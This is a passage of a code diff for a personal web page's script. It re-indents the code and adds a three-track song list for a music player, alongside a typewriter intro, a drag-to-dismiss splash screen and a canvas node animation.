-    const shuffled = remainingSongs.sort(() => Math.random() - 0.5); // Shuffle the remaining songs
-    const nextSongIndex = Math.floor(Math.random() * shuffled.length); // Choose a random next song
-    currentSongIndex = songs.indexOf(shuffled[nextSongIndex]); // Update the current song index
-    introAudio.src = songs[currentSongIndex]; // Set the shuffled song as the next song
-    introAudio.play(); // Play the song
-  }
-  // Adjust the audio volume
-  volumeSlider.addEventListener('input', (e) => {
-    introAudio.volume = e.target.value;
-  });
-  // Shuffle button functionality
-  shuffleButton.addEventListener('click', shuffleSongs);
-  
-  // Play the next song when the current one ends
-  introAudio.addEventListener('ended', playNextSong);
-  
-  // Toggle play/pause
-  audioToggle.addEventListener('click', () => {
-    if (introAudio.paused) {
+    // Array of songs
+    const songs = [
+      "https://files.catbox.moe/4e75y2.mp3",
+      "https://files.catbox.moe/gyhnmf.mp3",
+      "https://files.catbox.moe/i0zvrf.mp3"
+    ];
+    introAudio.loop = false;
+    let currentSongIndex = -1;
+    // Play the next song in the queue
+    function playNextSong() {
+      currentSongIndex = (currentSongIndex + 1) % songs.length;
+      introAudio.src = songs[currentSongIndex];
       introAudio.play();
-      audioToggle.textContent = 'Pause Music';
-    } else {
-      introAudio.pause();
-      audioToggle.textContent = 'Play Music';
     }
-  });
-
-  function typeWriter(element, text, speed=50, callback) {
-    let index = 0;
-    const interval = setInterval(() => {
-      element.textContent = text.slice(0, index);
-      index++;
-      if (index > text.length) {
-        clearInterval(interval);
-        element.style.borderRight = 'none';
-        if (callback) callback();
-      }
-    }, speed);
-  }
-  introAudio.volume = 0.5;
-
-  function runMainframeIntro() {
-    mainframeIntro.style.opacity = '1';
-    mainframeIntro.style.transition = 'opacity 0.5s ease';
-
-    const line1 = "Welcome!";
-    const line2 = "Transitioning to the main page...";
-
-    typeWriter(introLine1, line1, 100, () => {
-      setTimeout(() => {
-        typeWriter(introLine2, line2, 75, () => {
-          setTimeout(() => {
-            introLine1.classList.add('glitch');
-            introLine2.classList.add('glitch');
-            setTimeout(() => {
-              mainframeIntro.style.opacity = '0';
-              setTimeout(() => {
-                mainframeIntro.style.display = 'none';
-                document.querySelector('header').classList.add('loaded');
-                document.querySelector('.hero').classList.add('loaded');
-                document.querySelector('main').classList.add('loaded');
-                document.querySelector('footer').classList.add('loaded');
-              }, 1000);
-            }, 2000);
-          }, 1000);
-        });
-      }, 500);
+    
+    // Shuffle the playlist
+    function shuffleSongs() {
+      const remainingSongs = songs.filter((_, index) => index !== currentSongIndex); // Exclude the current song
+      const shuffled = remainingSongs.sort(() => Math.random() - 0.5); // Shuffle the remaining songs
+      const nextSongIndex = Math.floor(Math.random() * shuffled.length); // Choose a random next song
+      currentSongIndex = songs.indexOf(shuffled[nextSongIndex]); // Update the current song index
+      introAudio.src = songs[currentSongIndex]; // Set the shuffled song as the next song
+      introAudio.play(); // Play the song
+    }
+    // Adjust the audio volume
+    volumeSlider.addEventListener('input', (e) => {
+      introAudio.volume = e.target.value;
     });
-  }
+    // Shuffle button functionality
+    shuffleButton.addEventListener('click', shuffleSongs);
+    
+    // Play the next song when the current one ends
+    introAudio.addEventListener('ended', playNextSong);
+    
+    // Toggle play/pause
+    audioToggle.addEventListener('click', () => {
+      if (introAudio.paused) {
+        introAudio.play();
+        audioToggle.textContent = 'Pause Music';
+      } else {
+        introAudio.pause();
+        audioToggle.textContent = 'Play Music';
+      }
+    });
 
-  function onPointerDown(e) {
-    isDragging = true;
-    startY = e.touches ? e.touches[0].clientY : e.clientY;
-    splashDragOverlay.style.transition = 'none';
-
-    if (!audioStarted) {
-      audioStarted = true;
-      const randomSong = songs[Math.floor(Math.random() * songs.length)];
-      introAudio.src = randomSong;
-      introAudio.play().catch(err => console.log("Audio start blocked:", err));
+    function typeWriter(element, text, speed=50, callback) {
+      let index = 0;
+      const interval = setInterval(() => {
+        element.textContent = text.slice(0, index);
+        index++;
+        if (index > text.length) {
+          clearInterval(interval);
+          element.style.borderRight = 'none';
+          if (callback) callback();
+        }
+      }, speed);
     }
-  }
+    introAudio.volume = 0.5;
 
-  function onPointerMove(e) {
-    if (!isDragging) return;
-    currentY = e.touches ? e.touches[0].clientY : e.clientY;
-    const diff = startY - currentY;
-    if (diff > 0) {
-      splashDragOverlay.style.transform = `translateY(-${diff}px)`;
-      splashDragOverlay.style.opacity = Math.max(1 - diff/300, 0.5);
-    }
-  }
+    function runMainframeIntro() {
+      mainframeIntro.style.opacity = '1';
+      mainframeIntro.style.transition = 'opacity 0.5s ease';
 
-  function onPointerUp() {
-    if (!isDragging) return;
-    isDragging = false;
-    const diff = startY - currentY;
-    splashDragOverlay.style.transition = 'transform 0.3s ease, opacity 0.3s ease';
+      const line1 = "Welcome!";
+      const line2 = "Transitioning to the main page...";
 
-    if (diff > threshold) {
-      splash.style.opacity = '0';
-      setTimeout(() => {
-        splash.style.display = 'none';
-        runMainframeIntro();
-      }, 500);
-    } else {
-      splashDragOverlay.style.transform = 'translateY(0)';
-      splashDragOverlay.style.opacity = '1';
-    }
-  }
-
-  splashDragOverlay.addEventListener('mousedown', onPointerDown);
-  splashDragOverlay.addEventListener('mousemove', onPointerMove);
-  splashDragOverlay.addEventListener('mouseup', onPointerUp);
-  splashDragOverlay.addEventListener('mouseleave', onPointerUp);
-
-  splashDragOverlay.addEventListener('touchstart', onPointerDown, {passive: true});
-  splashDragOverlay.addEventListener('touchmove', onPointerMove, {passive: true});
-  splashDragOverlay.addEventListener('touchend', onPointerUp);
-
-  // Plexus Animation
-  const plexusCanvas = document.getElementById('plexusCanvas');
-  const ctx = plexusCanvas.getContext('2d');
-  let width = plexusCanvas.width = window.innerWidth;
-  let height = plexusCanvas.height = window.innerHeight;
-
-  window.addEventListener('resize', () => {
-    width = plexusCanvas.width = window.innerWidth;
-    height = plexusCanvas.height = window.innerHeight;
-    initNodes();
-  });
-
-  const NUM_NODES = 50;
-  const MAX_DISTANCE = 150; 
-  const SPEED = 0.3;
-  const nodes = [];
-
-  function initNodes() {
-    nodes.length = 0;
-    for (let i = 0; i < NUM_NODES; i++) {
-      nodes.push({
-        x: Math.random() * width,
-        y: Math.random() * height,
-        vx: (Math.random() - 0.5) * SPEED,
-        vy: (Math.random() - 0.5) * SPEED,
-        color: "#48a9a6"
+      typeWriter(introLine1, line1, 100, () => {
+        setTimeout(() => {
+          typeWriter(introLine2, line2, 75, () => {
+            setTimeout(() => {
+              introLine1.classList.add('glitch');
+              introLine2.classList.add('glitch');
+              setTimeout(() => {
+                mainframeIntro.style.opacity = '0';
+                setTimeout(() => {
+                  mainframeIntro.style.display = 'none';
+                  document.querySelector('header').classList.add('loaded');
+                  document.querySelector('.hero').classList.add('loaded');
+                  document.querySelector('main').classList.add('loaded');
+                  document.querySelector('footer').classList.add('loaded');
+                }, 1000);
+              }, 2000);
+            }, 1000);
+          });
+        }, 500);
       });
     }
-  }
 
-  function draw() {
-    ctx.clearRect(0, 0, width, height);
+    function onPointerDown(e) {
+      isDragging = true;
+      startY = e.touches ? e.touches[0].clientY : e.clientY;
+      splashDragOverlay.style.transition = 'none';
 
-    for (let i = 0; i < NUM_NODES; i++) {
-      let node = nodes[i];
-      node.x += node.vx;
-      node.y += node.vy;
-      if (node.x < 0 || node.x > width) node.vx = -node.vx;
-      if (node.y < 0 || node.y > height) node.vy = -node.vy;
-    }
-
-    for (let i = 0; i < NUM_NODES; i++) {
-      for (let j = i+1; j < NUM_NODES; j++) {
-        let dx = nodes[i].x - nodes[j].x;
-        let dy = nodes[i].y - nodes[j].y;
-        let dist = Math.sqrt(dx*dx + dy*dy);
-        if (dist < MAX_DISTANCE) {
-          let alpha = 1 - dist / MAX_DISTANCE;
-          ctx.strokeStyle = `rgba(72,169,166,${alpha})`;
-          ctx.lineWidth = 1;
-          ctx.beginPath();
-          ctx.moveTo(nodes[i].x, nodes[i].y);
-          ctx.lineTo(nodes[j].x, nodes[j].y);
-          ctx.stroke();
-        }
+      if (!audioStarted) {
+        audioStarted = true;
+        const randomSong = songs[Math.floor(Math.random() * songs.length)];
+        introAudio.src = randomSong;
+        introAudio.play().catch(err => console.log("Audio start blocked:", err));
       }
     }
 
-    for (let i = 0; i < NUM_NODES; i++) {
-      let node = nodes[i];
-      ctx.beginPath();
-      ctx.arc(node.x, node.y, 3, 0, Math.PI*2);
-      ctx.fillStyle = node.color;
-      ctx.shadowBlur = 10;
-      ctx.shadowColor = node.color;
-      ctx.fill();
-      ctx.shadowBlur = 0;
+    function onPointerMove(e) {
+      if (!isDragging) return;
+      currentY = e.touches ? e.touches[0].clientY : e.clientY;
+      const diff = startY - currentY;
+      if (diff > 0) {
+        splashDragOverlay.style.transform = `translateY(-${diff}px)`;
+        splashDragOverlay.style.opacity = Math.max(1 - diff/300, 0.5);
+      }
     }
 
-    requestAnimationFrame(draw);
-  }
+    function onPointerUp() {
+      if (!isDragging) return;
+      isDragging = false;
+      const diff = startY - currentY;
+      splashDragOverlay.style.transition = 'transform 0.3s ease, opacity 0.3s ease';
 
-  initNodes();
-  draw();
+      if (diff > threshold) {
+        splash.style.opacity = '0';
+        setTimeout(() => {
+          splash.style.display = 'none';
+          runMainframeIntro();
+        }, 500);
+      } else {
+        splashDragOverlay.style.transform = 'translateY(0)';
+        splashDragOverlay.style.opacity = '1';
+      }
+    }
 
-</script>
+    splashDragOverlay.addEventListener('mousedown', onPointerDown);
+    splashDragOverlay.addEventListener('mousemove', onPointerMove);
+    splashDragOverlay.addEventListener('mouseup', onPointerUp);
+    splashDragOverlay.addEventListener('mouseleave', onPointerUp);
+
+    splashDragOverlay.addEventListener('touchstart', onPointerDown, {passive: true});
+    splashDragOverlay.addEventListener('touchmove', onPointerMove, {passive: true});
+    splashDragOverlay.addEventListener('touchend', onPointerUp);
+
+    // Plexus Animation
+    const plexusCanvas = document.getElementById('plexusCanvas');
+    const ctx = plexusCanvas.getContext('2d');
+    let width = plexusCanvas.width = window.innerWidth;
+    let height = plexusCanvas.height = window.innerHeight;
+
+    window.addEventListener('resize', () => {
+      width = plexusCanvas.width = window.innerWidth;
+      height = plexusCanvas.height = window.innerHeight;
+      initNodes();
+    });
+
+    const NUM_NODES = 50;
+    const MAX_DISTANCE = 150; 
+    const SPEED = 0.3;
+    const nodes = [];
+
+    function initNodes() {
+      nodes.length = 0;
+      for (let i = 0; i < NUM_NODES; i++) {
+        nodes.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          vx: (Math.random() - 0.5) * SPEED,
+          vy: (Math.random() - 0.5) * SPEED,
+          color: "#48a9a6"
+        });
+      }
+    }
+
+    function draw() {
+      ctx.clearRect(0, 0, width, height);
+
+      for (let i = 0; i < NUM_NODES; i++) {
+        let node = nodes[i];
+        node.x += node.vx;
+        node.y += node.vy;
+        if (node.x < 0 || node.x > width) node.vx = -node.vx;
+        if (node.y < 0 || node.y > height) node.vy = -node.vy;
+      }
+
+      for (let i = 0; i < NUM_NODES; i++) {
+        for (let j = i+1; j < NUM_NODES; j++) {
+          let dx = nodes[i].x - nodes[j].x;
+          let dy = nodes[i].y - nodes[j].y;
+          let dist = Math.sqrt(dx*dx + dy*dy);
+          if (dist < MAX_DISTANCE) {
+            let alpha = 1 - dist / MAX_DISTANCE;
+            ctx.strokeStyle = `rgba(72,169,166,${alpha})`;
+            ctx.lineWidth = 1;
+            ctx.beginPath();
+            ctx.moveTo(nodes[i].x, nodes[i].y);
+            ctx.lineTo(nodes[j].x, nodes[j].y);
+            ctx.stroke();
+          }
+        }
+      }
+
+      for (let i = 0; i < NUM_NODES; i++) {
+        let node = nodes[i];
+        ctx.beginPath();
+        ctx.arc(node.x, node.y, 3, 0, Math.PI*2);
+        ctx.fillStyle = node.color;
+        ctx.shadowBlur = 10;
+        ctx.shadowColor = node.color;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+      }
+
+      requestAnimationFrame(draw);
+    }
+
+    initNodes();
+    draw();
+
+  </script>
 </body>
 </html>
